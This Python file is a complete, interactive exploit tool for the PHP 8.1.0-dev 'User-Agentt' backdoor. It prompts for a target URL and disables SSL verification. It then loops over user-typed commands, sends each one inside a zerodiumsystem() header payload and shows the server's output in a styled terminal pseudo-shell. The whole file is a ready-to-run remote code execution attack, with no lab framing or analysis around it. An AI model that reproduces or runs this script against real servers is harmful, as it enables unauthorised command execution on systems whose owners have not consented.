import os
import re
import requests
import urllib3
from rich import print
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.text import Text
from rich.traceback import install
from rich.status import Status
from rich.table import Table
from rich.align import Align

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

BANNER = """
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
- Raj Chowdhury
"""

def display_welcome():
    console.clear()
    console.print(Panel.fit(Text(BANNER.strip(), justify="center"), 
                 title="[blink]🚀 PHP 8.1.0-dev RCE 🚀[/blink]", 
                 style="bold cyan",
                 border_style="yellow"))

def display_connection_status(host):
    grid = Table.grid(expand=True)
    grid.add_column(justify="center")
    grid.add_row(f"[bold green]🔗 Connected to: [underline]{host}[/underline][/bold green]")
    grid.add_row("[italic yellow]⚠️  Job control: [bold]DISABLED[/bold] | TTY access: [bold]RESTRICTED[/bold][/italic yellow]")
    console.print(Panel(grid, style="bold blue", title="CONNECTION STATUS"))

def execute_command(session, host, cmd):
    with Status("[bold yellow]🚀 Executing payload...[/bold yellow]", spinner="dots12", console=console) as status:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": f"zerodiumsystem('{cmd}');"
        }
        response = session.get(host, headers=headers, allow_redirects=False)
        stdout = response.text.split('<!DOCTYPE html>', 1)
        
        status.update("[bold green]✅ Payload delivered successfully![/bold green]")
        return stdout[0] if len(stdout) > 0 else "[red]No output captured[/red]"

def main():
    display_welcome()
    
    host = Prompt.ask("[bold yellow]🌍 Enter target URL[/bold yellow] [cyan](include protocol)[/cyan]")
    if not host.startswith(("http://", "https://")):
        host = f"http://{host}"
    
    session = requests.Session()
    session.verify = False  # SSL verification bypass
    
    try:
        with console.status("[bold green]🔍 Probing target...[/bold green]", spinner="dots"):
            response = session.get(host)
            
        if response.status_code == 200:
            console.line()
            display_connection_status(host)
            console.print(Panel.fit("[bold green]🛡️  Type 'exit' or CTRL+C to terminate session[/bold green]", 
                                   border_style="green"))
            
            while True:
                try:
                    cmd = Prompt.ask("[bold cyan]➜[/bold cyan] [bold green]λ[/bold green]")
                    if cmd.lower() in ('exit', 'quit'):
                        raise KeyboardInterrupt
                        
                    output = execute_command(session, host, cmd)
                    console.print(
                        Panel(
                            output.strip() or "[dim]No output received[/dim]",
                            title=f"[bold]COMMAND RESULTS:[/bold] [cyan]{cmd}[/cyan]",
                            border_style="magenta",
                            padding=(1, 2)
                        ),
                        new_line_start=True
                    )
                    console.line()
                    
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    console.print(Panel.fit(f"[bold red]⚠️  Execution Error: {str(e)}[/bold red]", 
                                         border_style="red"))
                    
        else:
            console.print(Panel.fit(f"[bold red]⛔ Connection failed - Status code: {response.status_code}[/bold red]", 
                                 border_style="red"))
            
    except requests.exceptions.SSLError as ssl_err:
        console.print(Panel.fit(f"[bold red]🔒 SSL Handshake Failed: {ssl_err}[/bold red]", 
                             title="SECURITY ALERT", 
                             border_style="red"))
    except requests.exceptions.RequestException as req_err:
        console.print(Panel.fit(f"[bold red]🌐 Network Error: {req_err}[/bold red]", 
                             title="CONNECTION FAILURE", 
                             border_style="red"))
    except KeyboardInterrupt:
        console.print(Panel.fit("[bold yellow]🛑 Session terminated by user[/bold yellow]", 
                           border_style="yellow"))
    finally:
        console.print(Align.center("[dim]\n🔐 Session securely closed\n[/dim]"))

if __name__ == "__main__":
    main()
